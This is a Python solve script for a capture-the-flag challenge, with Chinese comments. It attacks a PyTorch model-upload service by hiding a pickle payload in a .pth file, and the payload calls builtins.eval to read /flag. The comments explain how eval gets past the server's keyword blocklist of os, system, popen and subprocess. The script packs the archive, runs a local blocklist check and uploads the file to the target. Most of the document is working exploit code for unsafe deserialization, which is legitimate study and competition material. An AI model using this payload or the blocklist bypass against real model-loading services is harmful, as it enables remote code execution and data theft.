#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
43 · hd_pytorch?  (0xGame 2026 / AI + 动态环境)

思路
----
服务端提供「pth 文件安全加载服务」，把上传的 .pth 交给 torch.load()。
torch.load 内部就是 pickle.Unpickler -> 上传恶意 pickle 即可 RCE。

难点（本题真正的考点）：服务端有一层**关键字黑名单**，直接嗅探 pickle 字节流，
命中就 403「检测到恶意文件，已被拦截！」。实测命中的关键字（出现在 pickle 里即拦）：

    含 "os"            -> 拦     (os / posix / os.system ...)
    含 "system"        -> 拦
    含 "popen"         -> 拦
    含 "subprocess"    -> 拦
    eval / builtins / ctypes / __reduce__ / GLOBAL / "/flag" / "cat /flag"  -> 放行

因此不能走常规的 `(os.system, ("cmd",))` gadget。

绕过
----
`builtins.eval` 不在黑名单里，而 eval 能直接拿到 `open`（Python3 的 open 是
builtins 成员，`builtins.open` 在 PyTorch weights_only 白名单里，所以连
「降级为兼容模式」都不会触发）。于是：

    pickle 里只出现  GLOBAL 'builtins eval' + 字符串 "open('/flag').read()"
    其中不含 os / system / popen / subprocess -> 通过黑名单
    REDUCE 时 eval 执行 open('/flag').read() -> 读出 flag

flag 在根目录（题目明说），路径就是 /flag。

注意：**绝对不要在本机 pickle.load / torch.load 这个文件**（会真的执行代码）。
只用 pickletools.dis 做静态检查。

用法
----
    python3 scripts/43-solve.py                 # 生成 evil.pth
    python3 scripts/43-solve.py <URL>           # 生成并上传
    python3 scripts/43-solve.py --check evil.pth  # 静态反汇编检查
"""
import io
import os
import sys
import pickle
import zipfile
import pickletools

# --------------------------------------------------------------------------
# payload 构造
# --------------------------------------------------------------------------

# 真正要执行的表达式。刻意不含 os / system / popen / subprocess 等黑名单词。
EXPR = "open('/flag').read()"


class ReadFlag:
    """__reduce__ 返回 (builtins.eval, (EXPR,)) -> 服务端反序列化时执行。"""

    def __reduce__(self):
        return (eval, (EXPR,))


def build_pth(expr: str = EXPR, name: str = "archive") -> bytes:
    """
    手工拼一个 PyTorch 新式（zip）格式的 .pth：

        <name>/data.pkl   <- pickle 字节流（载荷）
        <name>/version    <- "3\\n"

    环境里没有 torch，所以不用 torch.save，直接 zipfile + pickle 拼。
    """
    pkl = pickle.dumps(ReadFlag() if expr == EXPR else _mk(expr), protocol=2)

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr(f"{name}/data.pkl", pkl)
        z.writestr(f"{name}/version", "3\n")
    return buf.getvalue()


def _mk(expr: str):
    class _P:
        def __reduce__(self):
            return (eval, (expr,))

    return _P()


def describe(data: bytes) -> str:
    """静态反汇编 <name>/data.pkl，确认字节流内容（不执行）。"""
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        pkl = z.read("archive/data.pkl")
    out = io.StringIO()
    pickletools.dis(pkl, out=out)
    return out.getvalue()


# --------------------------------------------------------------------------
# 黑名单自检（本地，纯字符串匹配，不加载）
# --------------------------------------------------------------------------
BLOCKLIST = ["os", "system", "popen", "subprocess"]


def check_blocklist(data: bytes):
    hits = [w for w in BLOCKLIST if w.encode() in data]
    return hits


# --------------------------------------------------------------------------
# 上传
# --------------------------------------------------------------------------
def upload(url: str, data: bytes, filename: str = "model.pth") -> str:
    import urllib.request
    import uuid

    boundary = "----dsh" + uuid.uuid4().hex
    body = io.BytesIO()
    body.write(f"--{boundary}\r\n".encode())
    body.write(
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode()
    )
    body.write(b"Content-Type: application/octet-stream\r\n\r\n")
    body.write(data)
    body.write(f"\r\n--{boundary}--\r\n".encode())

    req = urllib.request.Request(
        url.rstrip("/") + "/upload",
        data=body.getvalue(),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        return resp.read().decode("utf-8", "replace")


def main() -> int:
    argv = sys.argv[1:]

    if argv and argv[0] == "--check":
        data = open(argv[1], "rb").read()
        print(describe(data))
        print("blocklist hits:", check_blocklist(data) or "none")
        return 0

    data = build_pth()
    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "work",
                       "43_hdpytorch", "evil.pth")
    out = os.path.normpath(out)
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, "wb") as f:
        f.write(data)

    print(f"[+] payload -> {out}  ({len(data)} bytes)")
    print(f"[+] expr    = {EXPR}")
    hits = check_blocklist(data)
    print(f"[+] blocklist self-check: {hits or 'clean'}")
    print(describe(data))

    if argv:
        url = argv[0]
        print(f"[*] uploading to {url}/upload ...")
        print(upload(url, data))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
